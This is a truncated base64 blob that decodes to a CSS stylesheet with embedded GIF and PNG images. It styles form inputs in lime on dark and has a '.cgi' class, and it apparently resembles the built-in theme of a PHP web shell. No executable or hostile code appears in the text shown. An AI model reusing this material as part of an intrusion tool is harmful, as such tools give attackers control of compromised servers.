Q0J4SXNLREJnZ0lFSEZ5NE1BRERoeEFqU3B4SXNhTEZpeGd6YXB3WVFJRERqUjgzWGd3cHNxVEpreWhCVGt4SU1tT0FsaWtieHB4SnMyYkVseEpoTG1SNUVpY0FuVEY5Mmh4S05LaEhoaStCN2xTSUVxZlNnVWs1T2t3cXRLalZxeTRIRERnWXRXS0FBVStoVmpXWWRBQ0JzMmpUcGkzQTlxeldvMVRqaGtXcXM2UFd0eDZWZHNVNjFPNkF2QWJOYmhVWThxalhoQkR0b2dWTDFpeGJBd1hXc3AyYzFpeUJ4d1lJL0kxcnNpTmdnUU1NSEpnTXVZQmhxSi81MXV4NDJZRHJ0a3gvRGlqQStDZEJ4QVJmSmt4b1dmUEwybVFGbUhWOXRzRG92TCtOMDk0Y1ZTNU0zY016ejdYb2VmZnNBMkE5aDhiKzhXdHExVVlMRVAvL0s1ekFBUU5nQlZ5dVhSVTM0ZG1RWHhjLy9qZjQ1Zk1FNEc2UGZKLzI5SnZxalFaY1QvQzVOaUFBQW9pV1hYM2dyWFlkQVhJQmNCMXNVejNIM2dESGVVYVZlZmt4K0o1bytiV2ttRnVuRVFqaWZ6YzlTSjVPb2FIblhvTkJCY0FoY2tMSmlCOS9tOWxHR0dKZlFWWWlWT2JkTlZXQS9uR0ZWWUFoVWhjWGtRYzJkbDZUVnowMVlwSVJoYmJjV0R0cVZaeDRFQ0xrVVlMb1lTbWJqNXR0MXlXTUJYMzFwSmhJbFNkZWtUbHRCeVdhc3IwcFhtWS81bWJqWDNNRzUxcUpMQVg1bEhCMnZwa25uUWdhUjJWRTZsRzJhRTVFSGdvZWF4bmVkVUIrRGRrSW9YY1VCV0FjZTM0ZEYrZGlLS3BtWXdGc2ltWFphYWsyMUdLZlVjci8rWkZ3QW56S1ZZOW52Z2hScmR6OVZOYW5wU0lLSUpKMThhYlpvYTF5aFdSc0tKWG4xb0hKWlVpUXBRYkFwYUdWc1hYVUtZWmREc2xoc01JK3hLbW1OZHBJSExNOW1lY2Z1UGE5T1IrbXVoSHdXcFBldFJpWm8yZXhLdWxCdktaM0dZWGhsbFFka0pmU09DT3QrMmFsYm9oWVZrZ1lhbHFDQ0ZpUG1iVkcyM2UzK2J2WWJ1Zyt2QzFrTFI3TGJzQzU3U1lpZkpNcHlwUnV1d2tjbDJQeWFkYmJ2MjJwZFdka1A3TFdGcXl5ZFp4VFJZMVdPekxKZWlic2w1RFA2WnFUYzFUOTVHeksvS21sMW9vM3JlUnpVRzhOUnJSR2V6VjdOVm1jU2RWY3BzbFM1NkdEQ1crOXRFMWxXOVZkMjVBT2JiWGFkS2NwTjAxd2k1dTJ5M1gzTXczVjFuazN0TGZBZmhkK045NGlEVjc0NG94VHgzZmprRWVPMGVHQlMyNDU1SWRmcnZubU1uSHUrZWVnaHk3NjZDZ0ZCQUFoK1FRSkNnQUFBQ3dBQUFBQTdBQWVBQUFJL3dBQkNCeElzS0RCZ3dnVEtseklzS0hEaHhBalNweElzYUxGaXhnemF0eklzYVBIanlCRGloeXBNQURKa3loVHFsdzUwQ1RMbHpCanltem8wbUtBbWpOejZ0ekpFQ2ZGbXp5RDh2U3BrMmhFQVVhRktsMlpOQ1pRbTBoSk5sMGE5T25RcVE0RFJCVnBsZXBQckRiQm5uUjVVeXpOclNFRkNQQWExaXhFdFZuTGRsMG8xMlJTdVJ3RERGakxkYTlMdEd6akFqYW9kWUJodzNNQmFPVUxzYTVqdXdJR0VDQlFvSExseVpnelk5NDcrS0JadUNQMTdoMWd3QUFCdjRHenFoMnN0NEFCeXdVT0VPQjdjelhqaW80bHUzNDkyWEJtMkpvcGx5NHcyNmRXeXNRSFlOVjcrNkZiQUFLRVI3ZGNQUFZaMElvSnlFWmFWdnZzeUdxZjAvK1VmSUE0ZDZKMnliYU1MTm5BZHFCNlMwOTJYY0J2MHNqSE45djIzSmgwZmNqZWljY1djOW5KWnRWTjJzblhYRVlCYVBlZmdJUk54eHRsMnlsMjNIREtFVGJhY01nUmh4bGFXcmtsUUd6S3lUVUFpUkJTdFZpQW5xa2xHV3FFaVhkY2hSMUZ0bG1HQk4xMFlubUFIWGFBQVZIVmhwUi9qR25sM0FBR0NsU2JZVHlPdDFtS1VqbVlXRUU2VGdhaWpLUVpnS05UcEIyQUkzZ2tlaFlmQVg4dG1OQ0lYdUlVbm5aYkhoUVpmWlc5MXRsTWFGYlgwSFNYMmFtYWczT3lOR01CUXpJNUcwSUlHa2hnVmlnU0ZKNEFwWlhvR1pGK2RVbm1UbnI5Nktoek50TFhaa2xkYnBwVGE2L3RwbWVNYk9Lbldta2d3aFVmb0VZMTZDVmlpa1gvVjU2bmlxVWs2NmcwMVNYcmYzUWhxU1dVRjAxVjJJZGkrWWRZcSt6TjU5cWtMZUZZS2F2aGRiZmRYamxLeXBxTnZmV0ptNlRBVmh2YmFlRWRsQ1ZuMXNYbDNYa0hKa2hadG5ZTmhKMWlKNzdHSVlXQVVrdmxkRDlXRjE5NTg4M2FyWks3MG1wVHZJMzZ4R2lhaDViYjY3ZU9BYkRqWlVFUzlhNkZ0a25XbTQ1MzJTZ2Z2ZWcrYkJpNkZ0WVZvOGFtL1h0dnhTZ3UxaWxaOWlsYzBvanljVWJlcjlNNXE2YU1FMGRvOFdubzZVYmZiN0I1Mkp1eU1hTnI4bUpXZFdsWnFOZE82Zko2d2cxblhyTzgxdHFTMHducEpWWlpKVlVaM05mVW5ZYmFZMXhQTkdWaGgwV2JOZFpQeC9weFlpKzJSQ1hiQnVVY2x0VmRtd1VmWG0zM0tTMGFUUTZGeTZCNm9abmNOMVBhVWhsNDRuRXhkWGpiZEp2TmVFOStQbTQ1UjNZM2R2bm1Ld1VFQUNINUJBa0tBQUFBTEFBQUFBRHNBQjRBQUFqL0FBRUlIRWl3b0VHREFRNHFYTWl3b2NPSEVDTktuRWl4b3NXTEdBVUdTSml4bzhlUElFT0tIRmx4STBlU0tCVnVUTW15cGNlVEhVM0NkTm5TWk1PWk5IUFd6Q2hUcDg4QUFuQnE5RW4wcHRDSlIyOEtHQkMwcU00QVRBVU03RGt5cWRPRkszbFNoRG9BcHRXclBBVUVaVW9WNVZld0JZRnFuVGlBZ05TcFo5RldYTHB4YWRlY1diZTZCQnFYWWQ2SFVBbWN0Q2xYSk4yZ1hOL1MvQXU0NzBXK01iMktiV3BRQUFIQkdoMFhqc2lWY0Z2RkVEV25aYnhRYkUzS2tSTVNLR0NnUUlITG9DMjd6YnhaSk5BQmQxY0dEb3I2SUdHTXYzM1RiVGtjNU1iWHVOc2VNTkFWNnV1M3BHdnpUSTZ3TFc0Q1pFZUxOZ3JnZG5LbXVMZFQvelFOMkNGUXVqS0JGampndXNEZDd1SUJXOGJkRyt2NStBUHREbENvLy9MbDkxbmhSOUI1YlJuUUdtdXR6Y2JaWE85aDFaWnJiczBFMUdvR0ZsRFhZQU1Zd041LzJkbVc0WUVHWW5iUVV2Nnhka0NFSlhrWDE0UUd6Q2FXZ0ZNTmdHQ0xaSWtsSTNPYUNUVVppZjZOQmRxQXQ3SDJHZ0VHNWpiaGN0aVJ4ZGh0SllZb2xXaTM5UllBQWV3aFpsbVZFZzZBWkpJZm9oaWFqRU1TTUpFQXJ0Rm5IMkF5bmhnVlh6SnBXY0NQZnFFMllZa1FJZ2dlVHM0NXVkS1ZRd3JwSldkWE51aFhXNWNaV0dHRVVGVTVJSlVLYXZTaG5KYnBxUlNWcnlHSVhWOHNKdmdkb2Y2SldKcUdYVTIySkpXQ05vUWFtVGkrbUJCUW9PSTJJSm5zTmYrWDFuWC93Y2tabzE4ZE9XUlVCYlpJcEFGd0JyQmVjeVRHaXVkU0lRbzFvWkM1TGJWZW95cFoxcDVyYW01S1lvaWxhc1RvVXZYRnFDaEU1RTJKbzFCdWN1dm9jdG1TTk9XSlNVMlc0WnQvTWFtaFd6WitSK1dCekg3RlozYkxhb3JucngwV0ZDbU52QmtZTEtPL0lpb2JwUUg3NXFaajZPRjZWS0Rod2ZxblJSQzNWdDk1dk9HS0ZZK2Qyb3VnZTVqMjZsN0NEYWQxWll0eXJ1dHBkeDVQNWJHMEZTWUkyMW1zQWx2eVV1d21sYWxycmFXclYyZ1MxeVVxc2kxR0I2Uk5rbDBIckVTQlVYaHhuRVFlQUI2aDdLcTg3YXFVeXBrY1lqa1NDV0dTM2NLSEcydjdtYmR3eW1sRlpHdHB3M0xzcktWbGovZmthbE12OUxYU3B0N0xhM1BlRzJWNDRtcFlHdGNkajYvTk81aE1Wd29HWTBadnEwVGh0QnZTOTNoMzhEbUtOMzExSnlhZzV6aURYSGRraDYrMm5udnd5Y1R3NWNCSlJCK240UVdYbXNDd1h6cVRYWkZMbDZLanowRTFMNisvd3F1N1VreGg3aHZmVUZ0bDlLVkRBY0F0NjhOejVGeUQwczdZKy9BT0ZXY1Vmc2lQRmw3cVptSWYwMERXSWVUZDZPTEhtTHY1T3RsMTRmZnBmd1IvL0VoeFJGNzkwTnRuK1huMGZ3UloveVZabjNueVo3N2JCSTZBNHVzZUFNKzBGdHRReFVZQ1hLQUUxV1c0a0VRSEtoR2NvQVloRWhBQUlma0VCUW9BQUFBc0FBQUFBT3dBSGdBQUNQOEFBUWdjU0ZCZ2dJSUlFeW9FY0hDaHc0VUJHaFlNTUVEQXc0c1lNMnJjeUxHang0OFhJNEljS0hFa3dvZ29CUW9RVU5Ha3k1Y3dZOHJNR01EaVNKRXpDYUprR1hGQXlaeEFQZUlNU3RRaHpwVkNoeEx0V1RFaTBxSlFhUXI0R2JXcXdaWWFsVUpsNmJNbVJaOVd3eUljQUZhc1dKNFlVMzdVYXZUclFaUmtiWnFOS25FQWdRRW5hOGFsT25jdFM0dDhHYkpOMm5ibDNZWU4vd2J1S3hQeGdBSmxBUWdnVUtDQWdjc0ZDRXhsZkhKalhMc0U3bllkREZMdFFKYWg3eDcreVZVdVo2QTRLV2FlT3NEQWdic3I3V0xlL0ZyeXhnQ1VEVlN1ZkNEejNwZHZIVk1XdlRMd1Y5NXI5eTRtaVRvMDlKa2lhMUl1VUJ3dlNwUUV1ay8vcityNm9nRHVQbGZtcm54WjgvaU1TSUhQZmkrUWJGUDZDQ2Nmd0p6NnVrR0t0b1hHWFFIKzNjUlFkWmtGS05GMzJ0MUdtbFg0TVJRZUFkK3BOeFZMN1QzNFgwb2w2YVZiZVE5UkpLQUI3a2xGZ0cwVmtSV2FneFBwVnlKd3hVSDMxWDBSU2loY1pzenh4WlJsZUlVMFdXaE5HWldWUmdJSTUxOU56Ym00bUY2cHBXYWZYWllKRjFtSXVrbDVJb2xCS3RRZ2lUTENTS0ZPRTNZWXBtVEJDU2RjZisvVmRGbUJXcWJvNEpLVFlXWVpaRFc2NU9WaTZ0VkdvRkpNQnBqbmsrSGRPT2VVQ2VrSDJXYmF6WG5ZU1ZkbVdWQ2NXRjY0SnFPM1hlbWVkaXNlT2gxRnhVWEkwNTJCNldkZlRkeVZXTldkSVJvS1pHNldYZ2xpQU9nNS8yV1hlQ2RoU0tLT2t3MzZGa3VsZ3RqaWRzUGQ5dVJubGhKcTBJU0t0Umtqa1RZQlowQlhDUTBRSTFhY1BsdW5VS0xTSjJKb2wvRTNGYWNFZ25tYmF3QWFJQ09rcGtLa2FwU0xwZ1dwY1lBMithVkRSUjZRWG5NL3dXanNRdENkWnkyK0I2SklsazduaVpldmlxdm1sVzkxWldyR0VFZDZYUWZqbmczdU9aRzBKSXBXRzVjUnlvWWpBUnlkQnhsV0NXbEkwbVBDSnNtZ3RPRkt0ZUNQQWxaV1pvcFV5ZGJldDJRV04rSjhKSGwxc20wNEhvZmR4dXpkcWhERGxvMTdyV0JjYVJ1bnc4MGg5MWkzdUNFNTliNFFGWnBuazdUNXl2VFVPRjRHbGxPQjVzaGd3Y09WWlhKcGt3a2RJcEpMRThSVmovbloxNlRhaUNISHFwemUvc25tRVZwR1Fja3p3V1hLYlBkK1hUM21zR0M5QlRYalNYYXA2T2lHamUwNmJOTlJQUldTajZqTmlhTnJQelliZCtOR1laNmRYUmR1dW5aSUd1bzFPbnhZcjdWcjFQbUZodGpycEpkTWxscW9RMXphNnBKNUhaUFB5QUV2NG9MQTU0NFJUOS9HRlZieS8wRkYvRTExOXQ2ejhqQjlpdm1wY2VQdUx1N1FNN1M3VHRqcjNmVjNSWGwvcXZBMFlUdDUrWFpXSkJmNk9hbFBsL2V2MHcrL1NkTlB0RC8zZGlwZStQNUhPU0VSa0lEMjYxa0NYelBBQXlwdmdUcUJvQU1uU0VHWVNMQ0NHQ3hmUUFBQU93PT0pfQ0KaW5wdXQsIHNlbGVjdCwgdGV4dGFyZWF7Y29sb3I6bGltZTsgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoKTsgbWFyZ2luLXRvcDoxcHg7IG1hcmdpbi1ib3R0b206MXB4OyBwYWRkaW5nOjJweDsgYm9yZGVyOjFweCBzb2xpZCAjNzViZjAwOyB0ZXh0LSBhbGlnbjpjZW50ZXJ9DQppbnB1dDpob3Zlciwgc2VsZWN0OmhvdmVyLCB0ZXh0YXJlYTpob3Zlcntjb2xvcjojNmQ2ZDZkOyBiYWNrZ3JvdW5kOnRyYW5zcGFyZW50IHVybCgpOyBiYWNrZ3JvdW5kLXJlcGVhdDpyZXBlYXQteDsgYmFja2dyb3VuZC1wb3NpdGlvbjo1MCUgYm90dG9tOyBtYXJnaW4tdG9wOjFweDsgbWFyZ2luLWJvdHRvbToxcHg7IHBhZGRpbmc6MnB4OyBib3JkZXI6MXB4IHNvbGlkICMzNTM1MzV9DQppbnB1dDpmb2N1cywgc2VsZWN0OmZvY3VzLCB0ZXh0YXJlYTpmb2N1c3tjb2xvcjojNmQ2ZDZkOyAgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoKTsgYmFja2dyb3VuZC1yZXBlYXQ6cmVwZWF0LXg7IGJhY2tncm91bmQtcG9zaXRpb246NTAlIGJvdHRvbTsgbWFyZ2luLXRvcDoxcHg7IG1hcmdpbi1ib3R0b206MXB4OyBwYWRkaW5nOjJweDsgYm9yZGVyOjFweCBzb2xpZCAjMzUzNTM1fQ0KaW1nLmFke3dpZHRoOjE2MHB4OyBoaWdodDozNXB4OyBib3JkZXI6bm9uZX0NCmltZy5ie3dpZHRoOjVweDsgaGlnaHQ6NXB4OyBib3JkZXI6bm9uZX0NCmltZ3ttYXgtd2lkdGg6MTAwJX0NCmJvZHl7Y29sb3I6Izc4Nzg3ODsgYmFja2dyb3VuZDp0cmFuc3BhcmVudCB1cmwoZGF0YTppbWFnZS9naWY7YmFzZTY0LFIwbEdPRGxoTWdBcUFQTUFBQUFBQUJRVUZCY1hGeGtaR1JvYUdod2NIQjBkSFNBZ0lDUWtKQ1ltSmpBd01LdXNyUUFBQUFBQUFBQUFBQUFBQUNINUJBVUtBQXNBSWY4TFRrVlVVME5CVUVVeUxqQURBUUFBQUN3QUFBQUFNZ0FxQUFBRS9oRElTYXU5T050UWdpUUlJUlhGeEhrQWdwamRGN29pY0VycU5BQTNjT2hUS2QyNWxBMG4yZTE0UitCa05RTDRWa3huVDBxYlBvVkNac21ISmVhTTB4K3hLdjd5a09VbEN3V0tGUklDeVN5bE1NaGJnRGJzamtJb05JQ0Jnb09FaFlFMUkxeHplako0Y3lRVGpJOWNYVlJlUldkS2wwMllTV09XbFZ4YlZWcFVvNXhaVGFJVVVaYWFZSnVhbHJDeVhINTJUbkI4ZTQwb2o3cDVMNzBqQ1liR3g4akpHSk5MVVpDN0tWRnppOEp6dGF3VVhMSlJtcStaWTZlZ3JhdTJWcXFrNTV2aTJVTkIzR1BlbmptL2NYUzRiL1Z6dDlEVU1SektBQU1LekNBSno3TmdNUXFpT0RnTkR5TmFuN2pBZ2hoRUc3d3hzS0NrczZReGxaUlZnZWxPZGFRWUJvM0phMmsyd1ZKSXJCNGpscm55T1hMWWFxRE5tOFlZNGtFMHJDZFBadEI0dXZyMExzZTJkaVdQbGd6bnpCUkhjNmlZc2t2WnBSdFJwS2lVeGd4YWg5L09yajN4Y2NWSnRxeWdnekQxUlVtN1V4cWVXZCtNWHUyVVVpdEtqNmVrb3Z1NHNTbklreGZkVFNDcHJtaExYZzM3Z0dXckdOYy9zOGNpQUFBaCtRUUZDZ0FMQUN3QkFBRUFNQUFvQUlNWEZ4Y21KaVl3TURBZEhSMGdJQ0FhR2hvWkdSa1VGQlFrSkNRY0hCd0FBQUQvLy84QUFBQUFBQUFBQUFBQUFBQUUvakFsUlJGU0srdTkxRWxjS0c2S1JFMlVjbEdHWW9TdUM1ZWplS1pxT29GY1NmZS9Xc1pIcktSYXJ4NXl4aE5xU2dHQXMzZVlXcS9ZckhiTDNYd09sQUtpUVBsV1Znb3gyWk1BczkyVzFKZTBGQnBoZFZLT0pYdnVZRHNwRjRCQlQzcytUUjE1STNkS2ZYcG9TQWxSWlcxaFk1VndBZ09YYTJadkZadGRvNlNsVnlwb2N5RmlXV2R5bGlVb2tZOVBCQmhZZ3JkNnNqcUZRNE80amJ0R2ZFa2t0cTNDaGhNSW0yV21KTTJjYjlEVjF0Y0xFeUltbVNjb2FXT3RMVGRNdXNzcHRnU3QzOXBBN2NOR0NPSzk1ZVVVNlZtd2sxTWUyUDcvQUZlRjY2SEcyeXMzQmVZWnMzS2pHQjV6aEJMeEsvS254enNiaXlaK3k2Z0lJaFZZUGdXaEFPaDBnaEsxZ0NoVFhzRUVLbGFLa0IrMHRGU0R6NTNIR0F1SCtIZzRMdDBGZVRZajFyTkk1R2ZOWVR5SDBxRVY0dE9ra2VBOFNYVFNMV29FQUNINUJBVUtBQXNBTEFFQUFRQXdBQ2dBZ3hjWEZ5WW1KakF3TUIwZEhTQWdJQm9hR2hrWkdSUVVGQ1FrSkJ3Y0hBQUFBUC8vL3dBQUFBQUFBQUFBQUFBQUFBVCtzS0N5cXIwNDY1MFJVZ1NvS0FZNUtvbVNqZDlLY0pyeWZXZzlwcXVzWWpyTWh5RlQ2YmE3c0lvV2tHL0piRHFmMEtoMFNzVWNFb2RiYWlRcGFFL1hyTXgzWEpXR3RkeFdlRUxBeXJ6VUdzZXoxZFp1RHR4NFB0R05kbjE3VHdwWEcxMDNBUUFqWVN4Vmo1Q1JUWTJGV0N3MGxUR0lLSDlrZ29JNkkyY3VJa1NpSkhweVJIaCtLQ3N6cmF0Nm55Wkhwd2FrUVlFa0NRRXhsSlFJQWdPTUNaTEh5TWxWWFVzSnhsSkN1V2ExcnRCeXIyTnhkcDFMcGFNL1NqeWd6OHJsNXVmb0YydUdLNVNiSGtodmRydTQ0cWgxTFV5bSs5ZmE1RWs5OU0xYjg0M1BQVUQ1bEhtcEpPYWRnSFFRSTFZb0pzWlp2QVV5TUZHeVNDak11SXNnZ3liUzAyZEFGWkVjQ1FIT3FXWUUxcDJQS0VHT2RHSUpoU0lXdzh5RmlRQUFJZmtFQlFvQUN3QXNBUUFCQURBQUtBQ0RGeGNYSmlZbU1EQXdIUjBkSUNBZ0dob2FHUmtaRkJRVUpDUWtIQndjQUFBQS8vLy9BQUFBQUFBQUFBQUFBQUFBQlA0d0piV3FYUVhkelpkU1dpZCswNmVVQ3BGeWl0R3lJQ1Z1cEhtYUNNaE9DWnpQdEpzSnBTS3dYQVlmY01sc09wL1FxSFRhL0J3U2gwK204RUg4bUZnU2FxdEZjQlhYZzR0YWFibHJuK0t4eFdQZlVLaGM2SEpmMjVGREpuSTBTR2xsWndnQ2JCMWJpNDZQa0pFS0JWVmVNazV2Tnl4RmdUNG1nRjFBTlN4Nm5VRTVOWG1pbWpTY282ZWZtWHBRV1pPUGlaRzV1cnM3S0dsUU9sU3ZmQ3BNWFplVnBueXpxMStZS3NNV0tjZ2pNYnhQZTlmYTJ4dGhhTjZHSU5uUzRlR1dWbGg4ZnMzVUhxQ2dNUjlJZkJQRzFqUThxVGlCUGRMck04Zm11SEF6TUI3QlJBUFExU3JuRFJjTGhyVVFXdUZHc2FMRml4Z3o3a3BCQm9TaWl3Tm1JZ0FBT3c9PSk7IGZvbnQ6MTFweCBUcmVidWNoZXQgTVMsVGFob21hOyBtYXJnaW46MDsgcGFkZGluZzowOyBib3JkZXI6MXB4IHNvbGlkICMzYjNiM2I7IG1hcmdpbjphdXRvOyBtYXgtd2lkdGg6NDUwcHh9DQpib2R5IGltZ3ttYXgtd2lkdGg6OTUlO21heC1oZWlnaHQ6OTUlO30NCmZvcm17Zm9udC1zaXplOnNtYWxsOyBtYXJnaW46MDsgcGFkZGluZzowfQ0KaDN7bWFyZ2luOjA7IHBhZGRpbmc6MDsgcGFkZGluZy1ib3R0b206MnB4fQ0KaHJ7bWFyZ2luLXRvcDoycHg7IG1hcmdpbi1ib3R0b206MnB4OyBib3JkZXItdG9wOjFweCBzb2xpZCAjNDM0MzQzOyBib3JkZXItcmlnaHQtc3R5bGU6bm9uZTsgYm9yZGVyLXJpZ2h0LXdpZHRoOjA7IGJvcmRlci1ib3R0b20tc3R5bGU6bm9uZTsgYm9yZGVyLWJvdHRvbS13aWR0aDowOyBib3JkZXItbGVmdC1zdHlsZTpub25lOyBib3JkZXItbGVmdC13aWR0aDowfQ0KcHttYXJnaW4tdG9wOjZweDsgbWFyZ2luLWJvdHRvbTo2cHh9DQp1bHttYXJnaW46MDsgcGFkZGluZy1sZWZ0OjIwcHh9DQouY2dpe2JhY2tncm91bmQ6dHJhbnNwYXJlbnQgdXJsKGRhdGE6aW1hZ2UvcG5nO2Jhc2U2NCxpVkJPUncwS0dnb0FBQUFOU1VoRVVnQUFBUEFBQUFGQUNBWUFBQUNDNlBGVEFBQmdGRWxFUVZSNG5PMWRQYWhUU1J0T1laSENJb1ZGaWxzWXNEQmdZY0RDZ0kwWExBeFlHTmhpTDFnc3dVS0N4UklzbG92TkVpd2tXRWl3a0l1RkVBc2hGa0lzaE5nSTJVTElGZ3ZaWWlGYmJKRmlpeFJicExDWTczM21KNWt6WitiOEpibm42amNISGs1eWZ0OHpaNTU1ZithZE9ZWEM1MExCdzhQakcwWHVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSjRlSGhrUis0Q2VIaDRaRWZ1QW5oNGVHUkg3Z0o0ZUhoa1IrNENlSGg0WkVmdUFuaDRlR1JIN2dKNGVIaGtSKzRDZUhoNFpFZnVBbmg0ZUdSSDdnSmt3T3FnekppQnZHWHkrUGJBdENWdldUSWpkd0hTRlBqRkNpZnI2Z0Jyd2tVSitUOXYrVHkrSFhEV2ZwWHMvY3JZTjB2bTNBVklVdGdvNzNKNVExaWR1UHgzZWYwN2Ixazl6ajVXcXhXekx0OGlrWE1YSUs2dzEyYXlJbTNadmlhc2RtaEsyOTl3dGlYdk1zd2JUU3JPSG1GSUdCTm1FZ3NMNWhKVGVleUEwQ1UwMEk2ZjFydlZpSngzMmNVaWR3R2lDdnJBMUxwbFEvTWFtbmdMQXUrU3NLR0s4QzIyN0Z1Z0tZazNsYVJjU2JBdHNKVFh3alZQQ00yTWhMYTlqN2dsNy9LTVJPNEMyQW9aNWF4cjNRQkpkWk5aVzEvTTVnZW5mWm03WHZJdTYxMmhLVFhzWWdka1RZS1YxTlNEbE5vNTlRczY2OW80ZHdFTXJDNlVET0thcG5MWjRnT24wOEN1RitSYUZ2OHUyT3pQR1p0OG5yRGh1eUU3ZVhuQytpLzZIQ2N2NlBmTFBodStHYkx4eHpHYi9qNWxpOFdDcmI0Ni9LeHZxWElrd0lra1VoTFNMalh6ZUNUSjE1Y2FWYTBIY3Q4MHhYVlgwaVR2SnlCeVF0bzZsN3pMTzRSOVhKU1RyYnpwNGxtVkV4SXJFS2dxUjVqS3V0YmRyRmN4R2pqSkMxb3VsMnp5MjRTVHMvVlRpOVZ2MUZtRnJsODhYNlM2VW9qSE9Yb01rcVYrcmM2T2ZqeGkzU2RkVG15UStwdXNJQllVTlcwYlJheVpQSzRqdFdTVlVFcFNoaElsZVE3T1BaYlhtc2NRZVNFYmdzaDZrTlhxK2lxUWlndjdmcTg3SjI5WkV1OUE4MWNQTnRzaVNYOWdhbGVYcVd6eGhTUDZnNU9RRnBxMWRiL0ZxcGVybklSSksxbFNnTlROdTAydXZlZi96TjBWNUl3VGVSQkRYR2hPQkozcUtjbWFGTGptWVVFRXhXWVJja1FST1NOOUErOHBsclMyUmlJbCtVK2R3Q0cvMVFZTHlZSlJac05NRG1sZWUvY1I3eHMyTkgzY2U1aDhtYkRPbzQ0ZzdSNHFtd3Rsa2hQYWZmUmh4SnhkR25MSm03QUtuUWp0QjdMMEpiR0twMWlPdUZkREVuWHBrQTBrYnhsRVJvTzl6YUxjSTFzNVJiN1BmVFRRT3lWdnlQdzExNVdRSmc2U3ZzeXMyamV3TDl4OXRENVdlMUZSTDJEOGFjeWFQelJac1pqUUxONGo2dGZyYlBCbVlDZHlCcE50MXlpVGpKT0MzUmNGY1dIYVZuSXV3NEtVb1Zld1d3ZVFmYXpWRGJ6L2RYbHZZMDRiWkV4OHZhL0I4M0luY01oa0RwbTNadkNKZmwrcXNoRHhuZWRhQWxZYWlWZG1vK0FveFBIbk1XdmNhZVJlMld5b1hhdXh3ZXZCL2w5NENyUWRoRmhLNHBiUFFMbVpLRXNpMnpReW51VUl4MTJxckdNU1hKdHUyUk9SaXJ6R2VXZUV3REhhTjZSVk40UUxhZGxFdnEvWldKVEZTM0lzaTM4V3JQMmd2UmZmZHRkbzNHNXcwOTYyUUd1Y0Zubmg2OXEwTHJhZkJZMGJoMXBCUkxOTitVRnNIdlYrTjJTTGY1ZThUTE9TV0RlbFU1LzhWWnlmTzRFak5hK051RnJXRkNPdHM5SGdOZzBicFpuTG0rdEVsQitDUmdnZzVWMmgwZ0NtL2ZFdngyejFuMkZXbjVJbW5sb3FQbnpKNWhrb203U0F4clZaRVJNcTQvR1hLUTlnTHY5YnBpWnhpTHhadFBndTNLT3R5RnNvR0pIaktEL1YrRytZdlN2bnVUSFhwQmV4c2dRbDBMcTJmanJLdlFKdEEzUmhUZitZV3QvOVBvaGJMTmdqdStpK09Zdm1jbExBWXJCcDR4a3BFSlF2MThUL3BkVEVHdm0yTmNQekkzQ2l5TEhON0ZYZFNoVkhNQ3ZHLzFYYXQxUmk3TjBvVkNEb3g0VlBtWGZGMlFVUXNVYVF5Nnc4dXlZeCtsdE5UUVVUdW5NR3ltQlg2RmxJUEwvVkVNazMveTVJRTY4U0plQ1lVZWl0ZkdnNmQvNzNQUHU3ekV4ZW5uUmhDMEJGWlV4dFNLd0dLUVN2bDBJRGc3eFBlOHdzYnZUbmxtaGYzcFZsMStqKzJyVysvMzJSRjc3aUxrM215cVVDTzd5SjExeGdwUXZVTUR3c3NPcGw4cWxma1psN1R4elR1aWUyN2JNY1lWS2J2djNpMWlGcDRoa25jU0pOL0ZYa0R1eUV3R3hMWHpnVGVRc08wOW5zTG5KMUk2bHp5allDeDJ0Z3Jua2Z0RU1GMFNkLzkxc0lWR1ZGKytlMnRXSnRTMkN6Znhka3JtOHBhNWxJZXZRakdoNGk3OFVDYTl3aTR2eEhadXNmWkpLL0pyTGVKMS8vUFBtaW4rbWVYd3ZzK0RGdGYwUGtMdTIvSE